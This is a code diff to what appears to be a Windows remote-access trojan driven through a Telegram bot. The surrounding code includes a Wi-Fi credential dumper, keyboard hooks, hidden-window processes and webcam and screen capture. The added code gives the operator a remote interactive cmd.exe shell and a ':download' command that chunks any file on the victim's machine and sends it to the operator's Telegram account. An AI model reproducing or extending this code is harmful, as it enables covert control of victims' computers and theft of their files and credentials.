@@ -66,7 +66,7 @@ from string import ascii_letters, printable
 from subprocess import CREATE_NO_WINDOW, PIPE, Popen
 from os import system, remove, getenv, getcwd, listdir, name, getlogin, chmod, rename
 from keyboard import press as press_key, release as release_key, read_event, KEY_DOWN
-from os.path import join, abspath, isfile, exists, dirname, realpath, split as pathsplit 
+from os.path import join, abspath, isfile, exists, dirname, realpath, split as pathsplit, basename, getsize
 
 #UTILS
 import pyngrok
@@ -356,6 +356,8 @@ You can run multiple commands at the same time by sending them in the same messa
 For example this command: "/fullclip 10; /jumpscare" will start the recording, waits 5 seconds, then sends a
 jumpscare while recording screen and webcam
 """
+
+TELEGRAM_BOT_LIMIT = 30 * 1024 * 1024  # 50 MB(I put 30MB just because 50 crashed a lot)
 
 def now() -> str:
     return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -859,7 +861,7 @@ class PeppinoTelegram:
         self.wifidumper = WifiDumper()
         self.all_session_messages: list[int] = []
 
-        self.cmd_session = CMDSession()
+        self.cmd_session = CMDSession("cmd.exe /K cd /d %USERPROFILE%'")
         self.cmd_session_active: bool = False
 
         LOADING_STATUS_MESSAGE = self.new_editable_message("Loading functions")#TODO Update user
@@ -1021,6 +1023,47 @@ class PeppinoTelegram:
         except Exception as e:
             return self.bsend(text, retries+1)
 
+    def download_file(self, path: str) -> None:
+        self.bsend(f"📤 Sending file: {path}")
+        if not isfile(path):
+            self.bsend(f"❌ Could not send file.\nThe file `{path}` does not exist or you don't have permission to access it.")
+            return
+
+        size = getsize(path)
+
+        if size <= TELEGRAM_BOT_LIMIT:
+            with open(path, "rb") as fi:
+                self.bot.sendDocument(self.owner_id, fi)
+                self.bsend("✅ File has been sent successfully!")
+            return
+
+        base_name = basename(path)
+        part_size = TELEGRAM_BOT_LIMIT - (len(base_name) + 10)
+
+        with open(path, "rb") as f:
+            part_num = 1
+            while True:
+                chunk = f.read(part_size)
+                if not chunk:
+                    break
+
+                part_name = f"{base_name}.part{part_num:03d}"
+                with open(part_name, "wb") as pf:
+                    pf.write(chunk)
+
+                with open(part_name, "rb") as pf:
+                    self.bot.sendDocument(
+                        self.owner_id,
+                        pf,
+                        caption=f"📦 {base_name} (part {part_num})"
+                    )
+
+                remove(part_name)
+                #self.bsend(f"📦 Part {part_num} sent.")
+                part_num += 1
+
+        self.bsend("✅ All file parts have been sent successfully!")
+
     """
 .oooooo.   ooo        ooooo oooooooooo.    .oooooo..o                              o8o
 d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                              `"'
@@ -1033,25 +1076,50 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def cmdsession(self) -> None:
         """Interactive CMD session via Telegram."""
         if self.cmd_session_active:
+            self.bsend("⚠️ CMD session is already active.")
             return
+
         self.cmd_session_active = True
         self.bsend("💻 CMD session started. Type 'exit' to quit.")
-        # checks if X(the output) is relevant and not composed only by newlines or spaces
+
+        # Start output reader threads
         self.cmd_session.run_output_reader_thread(
-            lambda x: self.bsend(f"\n{x}") if x.strip().replace(" ", "") else lambda: x,
-            lambda x: self.bsend(f"\n{x}") if x.strip().replace(" ", "") else lambda: x
+            lambda x: self.bsend(f"📥 {x}") if x.strip() else None,
+            lambda x: self.bsend(f"⚠️ {x}") if x.strip() else None
         )
+
         sleep(1)
-        while 1:
-            sleep(.5)
-            command = self.send_prompt("ENTER A COMMAND: ")
-            if command != "exit":
-                self.cmd_session.write_input(command)
-            else:
+
+        while True:
+            sleep(0.5)
+            command = self.send_prompt("🖊️ ENTER A COMMAND: ")
+            arguments = command.split()
+            if not arguments:
+                continue
+
+            program = arguments[0]
+
+            if command.lower() == "exit":
                 self.bsend("💻 CMD session stopped.")
                 self.cmd_session.stop_output_readed_thread()
                 self.cmd_session_active = False
                 break
+
+            elif program == ":download":
+                path = " ".join(arguments[1:])
+                self.bsend(f"📥 Preparing download for `{path}`")
+                #this is used as a check cause somethimes the cwd is not properly captured and executing another command does the job. And cd almost looks good in it.
+                self.cmd_session.write_input("cd")
+                sleep(4) # mmmmmmm so nice mmmmmmmm I love handling this fucking process
+                filepath = join(self.cmd_session.cwd, path)
+                self.bsend(f"📥 Starting download for `{filepath}`")
+                download_thread = Thread(target=self.download_file, args=(filepath,))
+                download_thread.start()
+                download_thread.join()
+
+            else:
+                self.cmd_session.write_input(command)
+                #self.bsend(f"▶️ Command sent: `{command}`")
 
     def cantopen(self, process: str) -> None:
         self.cantopenlist.append(process)
